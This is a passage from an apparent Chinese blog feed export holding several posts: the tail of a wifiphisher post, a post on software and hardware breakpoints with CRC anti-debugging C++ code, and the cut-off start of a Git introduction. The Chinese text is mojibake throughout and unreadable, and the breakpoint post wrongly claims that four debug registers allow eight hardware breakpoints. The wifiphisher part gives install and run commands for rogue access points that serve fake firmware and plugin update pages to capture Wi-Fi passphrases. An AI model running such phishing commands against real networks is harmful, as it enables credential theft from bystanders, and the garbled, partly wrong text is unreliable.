class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/sophron/wifiphisher.git <span class="comment"># Download the latest revision</span></span><br><span class="line"><span class="built_in">cd</span> wifiphisher <span class="comment"># Switch to tool&#x27;s directory</span></span><br><span class="line">sudo python setup.py install <span class="comment"># Install any dependencies (Currently, hostapd, dnsmasq, PyRIC, blessings) </span></span><br></pre></td></tr></table></figure><p><strong>Usage</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wifiphisher -aI wlan0 -jI wlan4 -p firmware-upgrade</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wifiphisher --essid CONFERENCE_WIFI -p plugin_update -pK s3cr3tp4ssw0rd</span><br></pre></td></tr></table></figure><p><a href="https://camo.githubusercontent.com/a5c1a17024a880122d4fa0c825f60112eda5d79f/68747470733a2f2f736f7068726f6e2e6769746875622e696f2f77696669706869736865722f7373352e706e67" class="gallery-item"><img src="https://camo.githubusercontent.com/a5c1a17024a880122d4fa0c825f60112eda5d79f/68747470733a2f2f736f7068726f6e2e6769746875622e696f2f77696669706869736865722f7373352e706e67"></a><br><a href="https://camo.githubusercontent.com/edac2b531e778d7c1e899743e5aecda7e322e1b5/68747470733a2f2f736f7068726f6e2e6769746875622e696f2f77696669706869736865722f7373322e706e67" class="gallery-item"><img src="https://camo.githubusercontent.com/edac2b531e778d7c1e899743e5aecda7e322e1b5/68747470733a2f2f736f7068726f6e2e6769746875622e696f2f77696669706869736865722f7373322e706e67"></a></p><p>æ›´å¤šè¯¦ç»†èµ„æ–™ <a href="https://github.com/sophron/wifiphisher">é¡¹ç›®åœ°å€</a><br><a href="http://www.leiphone.com/news/201510/bKHbxozIz7zyYCFy.html">æ–‡ç« åœ°å€</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Summary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WiFi </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ–­ç‚¹çš„é‚£äº›äº‹</title>
      <link href="Those-of-the-Breakpoint.html"/>
      <url>Those-of-the-Breakpoint.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p>å­¦ä¹ äºŒè¿›åˆ¶çš„è¿‡ç¨‹ä¸­æˆ‘ä»¬æ€»æ˜¯ä¼šé‡åˆ°æ–­ç‚¹ï¼Œæ¯•ç«Ÿè®¾ç½®æ–­ç‚¹èƒ½ä½¿æˆ‘ä»¬æ›´å¥½çš„è°ƒè¯•ç¨‹åºã€‚æ¥è§¦äºŒè¿›åˆ¶ä»¥æ¥ï¼Œç¬¬ä¸€æ¬¡æ¯”è¾ƒæ¸…æ¥šç³»ç»Ÿçš„äº†è§£äº†ä¸€ä¸‹æ–­ç‚¹ä»¥åŠä¸æ–­ç‚¹æœ‰å…³çš„è½¯ä»¶å®‰å…¨çš„ä¸œè¥¿ã€‚</p><h1 id="æ–­ç‚¹"><a href="#æ–­ç‚¹" class="headerlink" title="æ–­ç‚¹"></a>æ–­ç‚¹</h1><p>è®¾ç½®æ–­ç‚¹æˆ‘ä»¬å¯ä»¥ä½¿ä¸€ä¸ªè¿›ç¨‹çš„æ‰§è¡Œæš‚åœåœ¨ä¸€ä¸ªç¬¦åˆæŸç§ç‰¹å®šçš„æ¡ä»¶çš„ä½ç½®ä¸Šï¼Œæ­¤æ—¶æˆ‘ä»¬å¯ä»¥å¯¹ç¨‹åºçš„å˜é‡ï¼Œæ ˆä¸Šå‚æ•°ä»¥åŠåˆ†é…æƒ…å†µè¿›è¡ŒæŸ¥çœ‹ï¼Œå¹¶ä¸”åœ¨æ”¹å˜å‰æˆ‘å¯ä»¥äº†è§£ä»–ä»¬çš„é¢è²Œã€‚å› æ­¤ï¼Œæ–­ç‚¹æ˜¯æˆ‘ä»¬è°ƒè¯•ç¨‹åºå‡ ä¹å¿…ä¸å¯å°‘çš„åŠŸèƒ½ï¼Œé€šå¸¸æ–­ç‚¹æˆ‘ä»¬æœ‰ä¸‰ç§</p><ul><li>è½¯æ–­ç‚¹</li><li>ç¡¬ä»¶æ–­ç‚¹</li><li>å†…å­˜æ–­ç‚¹<br>åœ¨åé¢çš„å†…å®¹ä¸­ï¼Œæˆ‘å¯èƒ½ä¼šè®¾è®¡åˆ°é’ˆå¯¹è½¯ä»¶è°ƒè¯•ï¼Œæˆ‘ä»¬å¼€å‘äººå‘˜ä¼šç”¨åˆ°çš„é˜²å¾¡æªæ–½çš„å…³é”®ä»£ç ã€‚</li></ul><h1 id="è½¯æ–­ç‚¹"><a href="#è½¯æ–­ç‚¹" class="headerlink" title="è½¯æ–­ç‚¹"></a>è½¯æ–­ç‚¹</h1><p>è½¯æ–­ç‚¹çš„è®¾ç½®èƒ½å¤Ÿä½¿å¾—ç›®æ ‡è¿›ç¨‹åœ¨æ‰§è¡Œåˆ°ä¸€ä¸ªä½ç½®æŒ‡ä»¤çš„æ—¶å€™æš‚åœæ‰§è¡Œï¼Œè½¯æ–­ç‚¹æ˜¯ç›®å‰è°ƒè¯•ç¨‹åºæœ€é•¿ç”¨åˆ°çš„æ–­ç‚¹ç±»å‹ã€‚æˆ‘ä»¬å¸¸ç”¨è°ƒè¯•å™¨çš„F2åŠŸèƒ½ä¾¿æ˜¯å¸¸è§çš„è½¯æ–­ç‚¹ã€‚å®ƒçš„å®è´¨å°±æ˜¯ä¸€ä¸ªå•å­—èŠ‚çš„æŒ‡ä»¤ï¼Œæˆ‘ä»¬éƒ½çŸ¥é“ 0xccï¼Œå³INT3æŒ‡ä»¤çš„æ“ä½œç ï¼Œè¿™ä¸ªæŒ‡ä»¤æ˜¯å‘Šè¯‰CPUæš‚åœæ‰§è¡Œå½“å‰çš„è¿›ç¨‹ï¼Œè¿™ä¹Ÿå°±æ˜¯è½¯æ–­ç‚¹çš„æ ¸å¿ƒã€‚<br>å¦‚ä¸‹æ±‡ç¼–:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov eax,ebx</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæ±‡ç¼–ä»…æ˜¯ç®€å•çš„å°†å¯„å­˜å™¨ä¸­EBXçš„å€¼å­˜å…¥EAXä¸­ã€‚<br>è€Œåœ¨X86ç¯å¢ƒä¸‹ï¼Œå…¶æœºå™¨ç ä¸º</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">8BC3</span><br></pre></td></tr></table></figure><p>è¿™æ‰æ˜¯CPUæ‰å¯è¯†åˆ«çš„æœºå™¨è¯­è¨€ï¼Œ æœºå™¨ç  åˆ†ä¸ºæˆä¸¤éƒ¨åˆ†ï¼Œå³æ“ä½œç ä»¥åŠæ“ä½œæ•°ã€‚<br>è®¾ç½®è½¯æ–­ç‚¹å‰:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x66554433;          8BC3                  mov eax,ebx</span><br></pre></td></tr></table></figure><p>è®¾ç½®è½¯æ–­ç‚¹å:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x66554433;          CCC3                  mov eax,ebx</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å‰åçš„å˜åŒ–ï¼ŒåŒå­—èŠ‚çš„æ“ä½œç 8BC3ä¸­è¢«æ›¿æ¢äº†ä¸€ä¸ªå­—èŠ‚ï¼Œæ›¿æ¢çš„çš„å­—èŠ‚æ˜¯INT3çš„ä¸­æ–­æŒ‡ä»¤ï¼Œå•å­—èŠ‚å€¼ä¸º0xccã€‚å½“CPæ‰§è¡Œåˆ°è¿™é‡Œï¼Œå¹¶è§¦ç¢°åˆ°è¿™ä¸ªå­—èŠ‚çš„æ—¶å€™ï¼Œå°±å¼•å‘äº†ä¸€ä¸ªINT3çš„ä¸­æ–­äº‹ä»¶ã€‚è€Œè°ƒè¯•å™¨æ˜¯å¦‚ä½•å®ç°è¿™ä¸ªè¿‡ç¨‹çš„å‘¢ï¼Ÿå½“è°ƒè¯•å™¨éœ€è¦åœ¨ä¸€ä¸ªå†…å­˜åœ°å€ä¸Šè®¾ç½®æ–­ç‚¹çš„æ—¶å€™ï¼Œè°ƒè¯•å™¨é¦–å…ˆè¯»å–å†…å­˜ä¸Šçš„ç¬¬ä¸€ä¸ªæ“ä½œç å­—èŠ‚ï¼Œå¹¶å­˜å‚¨åœ¨æ–­ç‚¹åˆ—è¡¨ä¸­ï¼Œæ¥ç€è°ƒè¯•å™¨å°†å­—èŠ‚CCå†™å…¥è¢«è¯»å–çš„å†…å­˜åœ°å€å°†è‡³æ›¿æ¢æ‰ã€‚æ¥ç€å°±æ˜¯CPUå‘ç”ŸINT3äº‹ä»¶ï¼Œè¢«è°ƒè¯•å™¨æ‰€æ•è·ï¼Œæ¥ç€è°ƒè¯•å™¨ä¼šæŸ¥EIPæ˜¯å¦æŒ‡å‘æˆ‘ä»¬è®¾ç½®æ–­ç‚¹çš„å†…å­˜åœ°å€ï¼Œå¦‚æœæ˜¯ï¼Œè°ƒè¯•å™¨ä¼šå°†ä¹‹å‰çš„æ•°æ®å†™å›å†…å­˜åœ°å€ä¸­ï¼Œå½“è¿›ç¨‹æ¢å¤æ‰§è¡Œï¼Œå†™å›æ­£ç¡®çš„å­—èŠ‚æ•°æ®ã€‚</p><p>è€Œé’ˆå¯¹è½¯æ–­ç‚¹ï¼Œæˆ‘ä»¬çš„å¼€å‘è€…å¸¸ç”¨çš„ä¿æŠ¤æªæ–½å°±æ˜¯CRCæ ¡éªŒï¼Œå³å¾ªç¯å†—ä½™æ ¡éªŒï¼Œå¯ä»¥æ£€æµ‹ç¨‹åºå†…å®¹æ˜¯å¦è¢«æ”¹åŠ¨ï¼Œå› ä¸ºè½¯æ–­ç‚¹æ”¹å˜äº†å­—èŠ‚ï¼Œè‚¯å®šä¹Ÿæ”¹å˜äº†ç¨‹åºå†…å­˜çš„CRCæ ¡éªŒå€¼ã€‚åœ¨XPï¼Œæ²¡æœ‰ASLRæœºåˆ¶çš„æ—¶å€™ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨å¦‚ä¸‹ä»£ç </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD <span class="title">CRC32</span><span class="params">(BYTE* ptr,DWORD Size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   </span><br><span class="line">  DWORD crcTable[<span class="number">256</span>],crcTmp1;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">//åŠ¨æ€ç”ŸæˆCRC-32è¡¨</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">256</span>; i++)</span><br><span class="line">   &#123;</span><br><span class="line">    crcTmp1 = i;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j=<span class="number">8</span>; j&gt;<span class="number">0</span>; j--)</span><br><span class="line">     &#123;</span><br><span class="line">      <span class="keyword">if</span> (crcTmp1&amp;<span class="number">1</span>) crcTmp1 = (crcTmp1 &gt;&gt; <span class="number">1</span>) ^ <span class="number">0xEDB88320</span>L;</span><br><span class="line">       <span class="keyword">else</span> crcTmp1 &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">     crcTable[i] = crcTmp1;</span><br><span class="line">   &#125;</span><br><span class="line">  <span class="comment">//è®¡ç®—CRC32å€¼</span></span><br><span class="line">  DWORD crcTmp2= <span class="number">0xFFFFFFFF</span>;</span><br><span class="line">  <span class="keyword">while</span>(Size--)</span><br><span class="line">  &#123;</span><br><span class="line">    crcTmp2 = ((crcTmp2&gt;&gt;<span class="number">8</span>) &amp; <span class="number">0x00FFFFFF</span>) ^ crcTable[ (crcTmp2^(*ptr)) &amp; <span class="number">0xFF</span> ];</span><br><span class="line">    ptr++;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span> (crcTmp2^<span class="number">0xFFFFFFFF</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¶æ¬¡æ˜¯å…·ä½“çš„ä»£ç å®ç°ï¼Œå…·ä½“æœ‰ä¸¤ä¸ªéƒ¨åˆ†ï¼Œä¸€ä¸ªæ˜¯éœ€è¦è¢«ä¿æŠ¤çš„ä»£ç çš„å’Œéœ€è¦åˆ›å»ºä¸€ä¸ªçº¿ç¨‹æ¥è®¡ç®—æ ¡éªŒå€¼<br>å‡è®¾è¦è¢«ä¿æŠ¤çš„ä»£ç å¦‚ä¸‹:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">ProtectStart:   <span class="comment">//è¦ä¿æŠ¤çš„ä»£ç çš„èµ·å§‹åœ°å€</span></span><br><span class="line">  __asm</span><br><span class="line">  &#123;</span><br><span class="line">         inc eax   <span class="comment">//èŠ±æŒ‡ä»¤</span></span><br><span class="line">       dec eax</span><br><span class="line">       push eax</span><br><span class="line">       pop eax</span><br><span class="line">  &#125;</span><br><span class="line">start:</span><br><span class="line">     HMODULE hMod = GetModuleHandle(<span class="literal">NULL</span>);<span class="comment">//åŒæ ·æ˜¯èŠ±æŒ‡ä»¤</span></span><br><span class="line">     HMODULE hUser32 = LoadLibrary(<span class="string">&quot;user32.dll&quot;</span>);</span><br><span class="line">ProtectEnd:               <span class="comment">//è¦ä¿æŠ¤ä»£ç çš„ç»ˆç»“åœ°å€</span></span><br><span class="line">     DWORD dwThreadId = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">     STBINGLEPARAM stParam = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">       stParam.hEvent = CreateEvent(<span class="literal">NULL</span>,FALSE,FALSE,<span class="string">&quot;bingle&quot;</span>);</span><br><span class="line">     </span><br><span class="line">     DWORD dwAddr = <span class="number">0</span>;  <span class="comment">//ä¸€ä¸ªç¼“å­˜ç©ºé—´</span></span><br><span class="line">     __asm mov eax,offset ProtectStart  <span class="comment">//è®¡ç®—ä»£ç çš„èµ·å§‹åœ°å€</span></span><br><span class="line">     __asm mov dwAddr,eax</span><br><span class="line">     stParam.dwStart = dwAddr; <span class="comment">//ä¿å­˜åœ¨æˆ‘ä»¬è‡ªå·±å®šä¹‰çš„ç»“æ„ä½“é‡Œ</span></span><br><span class="line"></span><br><span class="line">       __asm mov eax,offset ProtectEnd <span class="comment">//è®¡ç®—ä¿æŠ¤ä»£ç çš„ç»“æŸåœ°å€ï¼ŒåŒæ ·ä¿å­˜åœ¨è‡ªå·±å®šä¹‰çš„                   ç»“æ„ä½“é‡Œã€‚</span></span><br><span class="line">     __asm mov dwAddr,eax</span><br><span class="line">     stParam.dwEnd = dwAddr;</span><br><span class="line">     </span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;å¼€å§‹äº†\n&quot;</span>);</span><br><span class="line">       CreateThread(<span class="literal">NULL</span>,<span class="number">0</span>,(LPTHREAD_START_ROUTINE)bingleProc,(LPVOID)&amp;stParam,<span class="number">0</span>,&amp;dwThreadId);</span><br></pre></td></tr></table></figure><p>åˆ›å»ºçº¿ç¨‹,ç”¨æ¥è®¡ç®—æ ¡éªŒå€¼<br>å¹¶ä¸”å°†çº¿ç¨‹çš„åˆ›å»ºæ”¾åœ¨å¾ªç¯ä¸­ï¼Œè¿™æ ·ä¿è¯åœ¨ç¨‹åºè¿è¡Œçš„è¿‡ç¨‹ä¸­ï¼Œä¼šä¸æ–­çš„ç›‘è§†å†…å­˜çš„æ•°æ®æ˜¯å¦æ”¹å˜ã€‚</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">CreateThread(<span class="literal">NULL</span>,<span class="number">0</span>,(LPTHREAD_START_ROUTINE)bingleProc,(LPVOID)&amp;stParam,<span class="number">0</span>,&amp;dwThreadId);</span><br><span class="line"></span><br><span class="line">     DWORD dwRet = <span class="number">0</span>;</span><br><span class="line">     dwRet = WaitForSingleObject(stParam.hEvent,INFINITE);</span><br><span class="line">     <span class="keyword">while</span>(dwRet == WAIT_OBJECT_0)</span><br><span class="line">     &#123;</span><br><span class="line">         Sleep(<span class="number">5000</span>);</span><br><span class="line">           CreateThread(<span class="literal">NULL</span>,<span class="number">0</span>,(LPTHREAD_START_ROUTINE)bingleProc,(LPVOID)&amp;stParam,<span class="number">0</span>,&amp;dwThreadId);</span><br><span class="line">       dwRet = WaitForSingleObject(stParam.hEvent,INFINITE);</span><br><span class="line">     &#125;</span><br><span class="line"><span class="comment">//ä¸Šè¾¹çš„ä»£ç æ˜¯åˆ›å»ºçº¿ç¨‹çš„ï¼Œæ ¹æ®åˆ›å»ºçº¿ç¨‹çš„è¿”å›å€¼æ¥ä½œä¸ºå¾ªç¯æ¡ä»¶ã€‚å…¶ä¸­stParamæ˜¯æˆ‘è‡ªå®šä¹‰ç»“æ„ä½“ç”Ÿæˆçš„ä¸€ä¸ªå¯¹è±¡ã€‚è¿™ä¸ªå¯¹è±¡ä¿å­˜åœ¨å †æ ˆä¸­ã€‚è¯¥ç»“æ„ä½“çš„å®šä¹‰å¦‚ä¸‹ï¼š</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> pack(1)</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> __<span class="title">STBINGLEPARAM</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  HANDLE hEvent;  <span class="comment">//ç”¨äºåŒæ­¥çš„ä¸€ä¸ªä¿¡å·é‡</span></span><br><span class="line">  DWORD dwStart;  <span class="comment">//è¦æ ¡éªŒçš„ä»£ç çš„èµ·å§‹åœ°å€</span></span><br><span class="line">  DWORD dwEnd;   <span class="comment">//è¦æ ¡éªŒçš„ä»£ç çš„ç»ˆç»“åœ°å€</span></span><br><span class="line">&#125;STBINGLEPARAM,*PBINGLEPARAM;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> pack()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//æ¥ä¸‹æ¥æ˜¯æ˜¯çº¿ç¨‹å‡½æ•°äº†ã€‚</span></span><br><span class="line">STBINGLEPARAM *stParam = (STBINGLEPARAM *)lpParameter;</span><br><span class="line">   </span><br><span class="line">  DWORD dwCodeSize = stParam-&gt;dwEnd - stParam-&gt;dwStart;</span><br><span class="line">  BYTE *pbyteBuf = <span class="literal">NULL</span>;</span><br><span class="line">  pbyteBuf = (BYTE *)stParam-&gt;dwStart;</span><br><span class="line">  </span><br><span class="line">  DWORD dwOldProtect = <span class="number">0</span>;</span><br><span class="line">  VirtualProtect((LPVOID)stParam-&gt;dwStart,<span class="number">4</span>*<span class="number">1024</span>,PAGE_EXECUTE_READWRITE,&amp;dwOldProtect);</span><br><span class="line">  <span class="keyword">if</span>(CRC32(pbyteBuf,dwCodeSize) != <span class="number">0xa0eb5866</span>)</span><br><span class="line">  &#123;</span><br><span class="line">     MessageBox(<span class="literal">NULL</span>,<span class="string">&quot;bingle&quot;</span>,<span class="string">&quot;ä»£ç è¢«ä¿®æ”¹äº†&quot;</span>,<span class="literal">NULL</span>);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;ä»£ç è¢«ä¿®æ”¹äº†\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">     SetEvent(stParam-&gt;hEvent);</span><br><span class="line">     ExitProcess(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>å½“ç„¶é™¤äº†æ ¡éªŒçš„æ–¹æ³•ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡è®¾å®šä¸€ä¸ªclockï¼Œå› ä¸ºæˆ‘ä»¬è°ƒè¯•æ˜¯éœ€è¦çš„æ—¶é—´çš„ï¼Œå› æ­¤å½“æˆ‘ä»¬è®¾ç½®ä¸€ä¸ªclockæ¥è®¡ç®—ç¨‹åºæš‚åœçš„æ—¶é—´ï¼Œå½“è¶…è¿‡ä¸€ä¸ªé˜ˆå€¼ï¼Œæˆ‘ä»¬å°±å¯ä»¥æ–­å®šæˆ‘ä»¬çš„çš„ç¨‹åºæ­£åœ¨è¢«è°ƒè¯•ï¼Œå¯ä»¥ç›´æ¥exit()é€€å‡ºï¼Œæˆ–åšä¸€äº›äº‹æƒ…ä¿æŠ¤æˆ‘ä»¬çš„ç¨‹åºã€‚</p><h1 id="ç¡¬ä»¶æ–­ç‚¹"><a href="#ç¡¬ä»¶æ–­ç‚¹" class="headerlink" title="ç¡¬ä»¶æ–­ç‚¹"></a>ç¡¬ä»¶æ–­ç‚¹</h1><p>ç¡¬ä»¶æ–­ç‚¹æ˜¯æœ‰è‡ªèº«çš„é€‚ç”¨åœºåˆçš„:<br>åˆ™æ˜¯å½“å°‘é‡çš„æ–­ç‚¹å³å¯æ»¡è¶³è°ƒè¯•ä»»åŠ¡ï¼Œæˆ–è€…å½“æˆ‘ä»¬çš„è°ƒè¯•ç›®æ ‡å®ç°äº†CRCæ ¡éªŒçš„åè°ƒè¯•æœºåˆ¶ã€‚è¿™ç§ç±»å‹æ–­ç‚¹çš„è®¾ç½®æ˜¯é€šè¿‡ä¸€ç»„CPUä¸Šçš„ç‰¹æ®Šçš„å¯„å­˜å™¨å®ç°çš„ã€‚ä¸€ä¸ªå…¸å‹çš„CPUåº”å½“æœ‰8ä¸ªçš„å¯„å­˜å™¨ï¼Œè¿™8ä¸ªå¯„å­˜å™¨å°±æ˜¯æˆ‘ä»¬æ‰€è¯´çš„ç‰¹æ®Šå¯„å­˜å™¨ï¼Œä¸€èˆ¬ç§°ä¹‹ä¸ºè°ƒè¯•å¯„å­˜å™¨ã€‚<br>æ¥ç€ä¸‹é¢çš„å†…å®¹æˆ‘ä»¬å¯ä»¥ç¨å¾®è¯¦ç»†çš„ä»‹ç»ä¸€ä¸‹è¿™8ä¸ªå¯„å­˜å™¨<br>DR0åˆ°DR3ï¼Œç”¨äºå­˜å‚¨æ‰€è®¾ç¡¬ä»¶æ–­ç‚¹å†…å­˜åœ°å€ï¼Œä¹Ÿæ­£æ˜¯å› ä¸ºå¦‚æ­¤ï¼Œæˆ‘ä»¬æ‰èƒ½åªèƒ½æœ€å¤šä½¿ç”¨8ä¸ªç¡¬ä»¶æ–­ç‚¹ã€‚<br>DR4å’ŒDR5ä¼šè¢«ä¿ç•™ã€‚<br>DR6ï¼Œè¿™ä¸ªå¯„å­˜å™¨ä¸Šè®°å½•äº†ä¸Šä¸€æ¬¡æ–­ç‚¹è§¦å‘æ‰€äº§ç”Ÿçš„è°ƒè¯•äº‹ä»¶ç±»å‹ä¿¡æ¯ã€‚å› æ­¤DR6å¯„å­˜å™¨åˆç§°ä¹‹ä¸ºè°ƒè¯•çŠ¶æ€å¯„å­˜å™¨ã€‚<br>DR7ï¼Œå­˜å‚¨å„ä¸ªæ–­ç‚¹çš„è§¦å‘æ¡ä»¶ä¿¡æ¯ï¼Œé€šè¿‡è®¾ç½®DR7å¯„å­˜å™¨ä¸Šçš„ç‰¹å®šæ ‡è®°ä½ï¼Œæˆ‘ä»¬å¯ä»¥æ–­ç‚¹è®¾å®šä¸€ä¸‹çš„è§¦å‘æ¡ä»¶:</p><ul><li>ç‰¹å®šå†…å­˜åœ°å€ä¸Šçš„æŒ‡ä»¤è¢«æ‰§è¡Œè§¦å‘æ–­ç‚¹</li><li>å½“æ•°æ®è¢«å†™å…¥ä¸€ä¸ªç‰¹å®šå†…å­˜å¼Ÿå­æ—¶è§¦å‘æ–­ç‚¹</li><li>å½“æ•°æ®è¢«è¯»å‡ºæˆ–å†™å…¥ï¼Œè¿™æ˜¯ä¸åŒ…æ‹¬æ‰§è¡Œï¼Œä¸€ä¸ªç‰¹å®šéå¯æ‰§è¡Œå†…å­˜åœ°å€è§¦å‘æ–­ç‚¹<br>å› æ­¤DR7å®è´¨ä¸Šæ˜¯ç¡¬ä»¶æ–­ç‚¹çš„æ¿€æ´»å¼€å…³ã€‚</li></ul></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Summary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Bin </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä½¿ç”¨Gitå¼€å‘ä½¿ç”¨ä»‹ç»</title>
      <link href="Us-Git-to-develop-usage-introduction.html"/>
      <url>Us-Git-to-develop-usage-introduction.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h1 id="ä»‹ç»"><a href="#ä»‹ç»" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h1><p>Gitæ˜¯ç›®å‰ä¸–ç•Œä¸Šæœ€å…ˆè¿›çš„åˆ†å¸ƒå¼ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿï¼Œç”±Linuxåˆ›å§‹äººLinusåœ¨2005å¹´å¼€å‘ï¼Œç”¨äºå¯¹æŠ—å•†ä¸šç‰ˆçš„ç‰ˆæœ¬æ§åˆ¶å·¥å…·BitKeeperï¼Œå†å²æ¯”è¾ƒæœ‰æ„æ€ï¼Œæ„Ÿå…´è¶£çš„å¸ˆå‚…ä»¬å¯ä»¥æœç´¢äº†è§£ä¸€ä¸‹ã€‚</p><ul><li>åˆ†å¸ƒå¼<br>é¦–å…ˆè¦è¯´æ˜çš„æ˜¯Gitæ˜¯ä¸€ä¸ªåˆ†å¸ƒå¼ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿï¼Œé‡ç‚¹åœ¨äºåˆ†å¸ƒå¼ã€‚ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬ä»githubä¸Šæ¯cloneä¸‹æ¥ä¸€ä¸ªé¡¹ç›®ï¼Œéƒ½æ˜¯cloneä¸‹ä¸€ä¸ªå®Œæ•´çš„ä»“åº“ï¼Œé‡Œé¢åŒ…å«äº†è¿œç¨‹ä»“åº“çš„æ‰€æœ‰ä¿¡æ¯ã€‚æˆ‘ä»¬åœ¨cloneçš„ç›®å½•ä¸‹ä¼šå‘ç°ä¸€ä¸ª.gitç›®å½•ï¼Œè¿™ä¸ªç›®å½•å°±æ˜¯æœ¬åœ°ä»“åº“æ‰€åœ¨çš„ä½ç½®ï¼Œæ³¨æ„ä¸è¦å»ä¿®æ”¹è¿™ä¸ªç›®å½•ï¼Œå¦‚æœåˆ 